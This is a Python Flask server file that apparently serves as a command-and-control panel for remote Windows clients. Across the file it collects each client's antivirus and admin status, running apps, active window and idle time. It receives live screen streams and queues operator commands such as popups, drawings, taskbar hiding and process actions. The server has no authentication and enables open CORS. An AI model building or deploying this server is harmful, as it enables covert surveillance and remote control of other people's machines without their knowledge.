from flask import Flask, request, jsonify
from flask_cors import CORS # Import CORS
import time # Import time for last_seen timestamp

app = Flask(__name__)
CORS(app) # Enable CORS for all origins
client_commands = {}
connected_clients = {} # New dictionary to store connected clients
client_streams = {} # New dictionary to store latest screen stream for each client

# Configuration
CLIENT_OFFLINE_THRESHOLD = 15 # seconds

@app.route('/health')
def health_check():
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json() # Expect JSON data from web interface
    client_id = data.get('client_id')
    ip = data.get('ip')
    system_info = data.get('system_info', {}) # Get system_info, default to empty dict
    
    if client_id:
        connected_clients[client_id] = {
            "ip": ip,
            "status": "online",
            "last_seen": time.time(),
            "cpu": system_info.get('cpu'),
            "memory_total": system_info.get('memory_total'),
            "memory_used": system_info.get('memory_used'),
            "memory_percent": system_info.get('memory_percent'),
            "disks": system_info.get('disks', []),
            "uptime": system_info.get('uptime'),
            "antivirus": system_info.get('antivirus'), # Get antivirus status
            "is_admin": system_info.get('is_admin'), # Get admin status
            "monitors": system_info.get('monitors', []),
            "running_apps": system_info.get('running_apps', []),
            "active_window": system_info.get('active_window', 'N/A'), # Get active window title
            "active_window_duration": system_info.get('active_window_duration', 0),
            "idle_time": system_info.get('idle_time', 0), # Get idle time
            "os_name": system_info.get('os_name', 'N/A'),
            "os_version": system_info.get('os_version', 'N/A'),
            "os_architecture": system_info.get('os_architecture', 'N/A'),
            "device_name": system_info.get('device_name', 'N/A'),
            "user_sessions": system_info.get('user_sessions', []),
            "has_password": system_info.get('has_password', False),
            "current_background_image": system_info.get('current_background_image', None),
            "taskbar_hidden": system_info.get('taskbar_hidden', False),
            "neptune": system_info.get('neptune', None) # Pass through Neptune process info
        }
        print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
        if system_info.get('current_background_image'):
            print(f"🖼️ Received background image data from {client_id}. Type: {system_info['current_background_image'].get('type')}, Size: {len(system_info['current_background_image'].get('data')) if system_info['current_background_image'].get('data') else 0} bytes.")
        else:
            print(f"🖼️ No background image data received from {client_id}.")
    return jsonify({"status": "ok"})

@app.route('/send-command', methods=['POST'])
def send_command():
    data = request.get_json() # Expect JSON data from web interface
    client_id = data.get("client_id")
    cmd = data.get("cmd")
    title = data.get("title", "")
    message = data.get("message", "")
    icon = data.get("icon", "") # Get icon, default empty string
    buttons = data.get("buttons", "") # Get buttons, default empty string
    topmost = data.get("topmost", False) # Get topmost, default False
    monitor_index = data.get("monitor_index", 1) # Get monitor_index, default to 1
    image = data.get("image", None) # Get image, default to None
    pid = data.get("pid", None) # Get pid, default to None
    image_type = data.get("image_type", "") # New: Get image_type, default empty string
    filters = data.get("filters", None) # New: Get filters, default None
    actions = data.get("actions", None) # Get drawing actions
    hide = data.get("hide", None) # Get taskbar hide status

    if client_id and cmd:
        # Store all relevant command data including monitor_index and image
        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters, "actions": actions, "hide": hide}
        print(f"Command '{cmd}' for client {client_id} (Hide: {hide}) received.")
        return jsonify({"status": "success", "message": "Command received"}), 200
    print(f"Invalid command data received: {data}")
    return jsonify({"status": "error", "message": "Invalid command data"}), 400

@app.route('/get-command')
def get_command():
    client_id = request.args.get('client_id')
    if client_id in client_commands:
        command_data = client_commands.pop(client_id) # Get and remove the command
        print(f"Sending command '{command_data.get('cmd')}' to client {client_id}")
        return jsonify(command_data)
    
    print(f"No command for client {client_id}")
    return jsonify({"cmd": "", "title": "", "message": "", "icon": "", "buttons": "", "topmost": False, "image": None}) # Removed default monitor_index

@app.route('/get-clients')
def get_clients():
    current_time = time.time()
    clients_to_remove = []

    # Check for offline clients
    for client_id, client_info in list(connected_clients.items()): # Use list() to iterate over a copy
        if current_time - client_info["last_seen"] > CLIENT_OFFLINE_THRESHOLD:
            if client_info["status"] != "offline":
                print(f"Client {client_id} marked as OFFLINE.")
            connected_clients[client_id]["status"] = "offline"
        
        # Optional: Remove clients that have been offline for a longer period (e.g., 5 minutes)
        # if client_info["status"] == "offline" and (current_time - client_info["last_seen"]) > (CLIENT_OFFLINE_THRESHOLD * 20):
        #     clients_to_remove.append(client_id)

    # for client_id in clients_to_remove:
    #     del connected_clients[client_id]

    print(f"Returning {len(connected_clients)} connected clients (after offline check).")
    for client_id, client_info in connected_clients.items():
        if client_info.get('current_background_image'):
            print(f"🖼️ Sending background image data for {client_id}. Type: {client_info['current_background_image'].get('type')}, Size: {len(client_info['current_background_image'].get('data')) if client_info['current_background_image'].get('data') else 0} bytes.")
        else:
            print(f"🖼️ No background image data available for {client_id} to send.")
    return jsonify(connected_clients)

@app.route('/stream', methods=['POST'])
def stream():
    client_id = request.headers.get('Client-ID')
    if not client_id:
        return jsonify({"status": "error", "message": "Client-ID header missing"}), 400

    image_data = request.get_data()
    if not image_data:
        return jsonify({"status": "error", "message": "No image data received"}), 400

    client_streams[client_id] = image_data
    return jsonify({"status": "ok"}), 200

@app.route('/get_stream')
def get_stream():
    client_id = request.args.get('client_id')
    if not client_id:
        return "", 400 # Bad request if client_id is missing

    image_data = client_streams.get(client_id)
    if image_data:
        return app.response_class(image_data, mimetype='image/jpeg')
    else:
        return "", 204 # No content if no stream available for this client

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
